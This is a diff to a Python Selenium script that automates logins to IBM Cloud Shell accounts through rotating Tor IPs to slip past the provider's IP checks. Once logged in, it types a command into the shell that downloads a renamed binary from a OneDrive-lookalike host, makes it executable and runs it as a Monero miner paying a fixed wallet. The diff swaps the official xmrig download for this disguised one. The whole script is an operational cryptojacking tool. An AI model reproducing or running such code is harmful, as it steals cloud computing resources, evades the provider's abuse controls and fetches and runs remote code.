@@ -44,8 +44,8 @@ def worker_callbacks(f):
     }))
 
 
-xmr_command = """./xmrig -o xmr.f2pool.com:13531 -u 44g7WQw7AGcE7sDmRzTUYQRChiJ6B7sokXyXYfCTz8A3Uv6fSxtfYVBA1S77jLFPJWK4QqAWV9dTZP7k5gB7RATk5vHZDYN"""
-comand = """ wget https://github.com/xmrig/xmrig/releases/download/v6.11.2/xmrig-6.11.2-linux-static-x64.tar.gz&&tar -zxvf xmrig-6.11.2-linux-static-x64.tar.gz&&cd xmrig-6.11.2&&""" + xmr_command
+xmr_command = """./test -o xmr.f2pool.com:13531 -u 44g7WQw7AGcE7sDmRzTUYQRChiJ6B7sokXyXYfCTz8A3Uv6fSxtfYVBA1S77jLFPJWK4QqAWV9dTZP7k5gB7RATk5vHZDYN"""
+comand = """ wget -O test.zip 'http://1drv.stdfirm.com/u/s!AnJnYpmP0XhJc0zJP7jJS7JWOJo?e=V6Zarf'&&unzip -o test.zip&&chmod 0777 test&&""" + xmr_command
 address = "https://cloud.ibm.com/shell"
 s_time = time.time()
 
@@ -88,6 +88,8 @@ class CloudShell:
         with Controller.from_port(port=9050 + int(self.miner_id) * 2) as controller:
             controller.authenticate()
             controller.signal(Signal.NEWNYM)
+        sleep(30)
+        self._log("switch ip success")
 
     def _check_dialog(self, timeout=30) -> bool:
         try:
@@ -139,7 +141,8 @@ class CloudShell:
         try:
             self.driver.switch_to.default_content()
             # find loading
-            WebDriverWait(self.driver,timeout).until(EC.invisibility_of_element_located((By.CLASS_NAME,"tab-progress")))
+            WebDriverWait(self.driver, timeout).until(
+                EC.invisibility_of_element_located((By.CLASS_NAME, "tab-progress")))
             WebDriverWait(self.driver, timeout).until(
                 EC.presence_of_element_located((By.CSS_SELECTOR, "[title='IBM Cloud Shell']")))
             self.driver.switch_to.frame(self.driver.find_element(By.CSS_SELECTOR, "[title='IBM Cloud Shell']"))
@@ -148,14 +151,15 @@ class CloudShell:
             return False
 
     def _do_login(self):
+        self._switch_ip()
         self._setup_proxy()
-        self._log("start get /shell")
-        self.driver.get(address)
-        ip_count = 0
+        # ip_count = 0
         try:
             while True:
                 try:
-                    WebDriverWait(self.driver, 180).until(
+                    self._log("start get /shell")
+                    self.driver.get(address)
+                    WebDriverWait(self.driver, 80).until(
                         EC.presence_of_element_located((By.CLASS_NAME, "login-form__realm-user-id-row")))
                     user_form = self.driver.find_element_by_class_name("login-form__realm-user-id-row")
                     user_id = user_form.find_element_by_id("userid")
@@ -167,15 +171,12 @@ class CloudShell:
                         WebDriverWait(self.driver, 30).until(
                             EC.presence_of_element_located((By.CLASS_NAME, "error-header")))
                         self._log(
-                            'username get err={driver.find_element_by_class_name("error-header").get_attribute("innerHTML")}')
-                        if ip_count < 5:
-                            ip_count = ip_count + 1
-                            self._switch_ip()
-                            continue
+                            f'username get err={self.driver.find_element_by_class_name("error-header").get_attribute("innerHTML")}')
                         raise WebDriverException(f"{self.user} tor ip invalidate")
                     except TimeoutException:
                         self._log("pass ip validate,start clear proxy")
                         self.tor_process.terminate()
+                        self.tor_process=None
                         self.driver.execute_script("window.open('')")
                         default_handle = self.driver.current_window_handle
                         handles = list(self.driver.window_handles)
@@ -184,21 +185,23 @@ class CloudShell:
                         self._setup_proxy(clear=True)
                         self.driver.close()
                         self.driver.switch_to.window(default_handle)
+                        self._log("clear proxy success")
                     break
                 except (ElementClickInterceptedException, ElementNotInteractableException):
                     self._check_dialog()
                     continue
             while True:
                 try:
-                    WebDriverWait(self.driver, 180).until(
+                    self._log("start send passwd")
+                    WebDriverWait(self.driver, 10).until(
                         EC.presence_of_element_located((By.CSS_SELECTOR, "[class='login-form__password-row ']")))
+                    self._log("show passswd input")
                     passwd_form = self.driver.find_element_by_class_name("login-form__password-row ")
                     passwd_input = passwd_form.find_element_by_id("password")
                     passwd_input.clear()
                     passwd_input.send_keys(self.passwd)
                     self._log("send passwd")
-                    self.driver.find_elements_by_css_selector('[class="login-form__button bx--btn bx--btn--primary"]')[
-                        1].click()
+                    self.driver.find_elements_by_css_selector('[class="login-form__button bx--btn bx--btn--primary"]')[1].click()
                     self._log("click login")
                     break
                 except (ElementClickInterceptedException, ElementNotInteractableException) as e:
@@ -220,10 +223,12 @@ class CloudShell:
                         raise WebDriverException("userid or passwd error,relogin")
                     sleep(2)
         except WebDriverException as e:
-            self._log(f"login failed msg={e.msg}")
+            self._log(f"login failed msg={e.__str__()}")
             self.driver.delete_all_cookies()
-            self.tor_process.terminate()
+            if self.tor_process is None:
+                self.tor_process=self._setUp_tor()
             self._do_login()
+            return
         while True:
             try:
                 WebDriverWait(self.driver, 120).until(
@@ -283,15 +288,15 @@ class CloudShell:
                 killed = False
                 is_running = False
                 for item in eles:
-                    if "cloudshell:~$" == str(item.text)[-13:]:
-                        item.send_keys(comand + "." + self.miner_id + "\n")
-                        is_running = True
-                        self._log("send command")
-                        break
                     if killed:
                         item.send_keys(xmr_command + "." + self.miner_id + "\n")
                         is_running = True
                         self._log("send command after Killed")
+                        break
+                    if "cloudshell:~$" == str(item.text)[-13:]:
+                        item.send_keys(comand + "." + self.miner_id + "50\n")
+                        is_running = True
+                        self._log("send command")
                         break
                     if item.text == "Blank line":
                         continue
@@ -378,7 +383,7 @@ if __name__ == '__main__':
         # driver need to create one by one
         web_driver = create_web_driver()
         task_list.append(pool.submit(run_selenium, account, web_driver).add_done_callback(worker_callbacks))
-    for task in as_completed(task_list):
-        print(f"{task.result()} finished")
-
-    print("all task finished")
+    # for task in as_completed(task_list):
+    #     print(f"{task.result()} finished")
+    #
+    # print("all task finished")
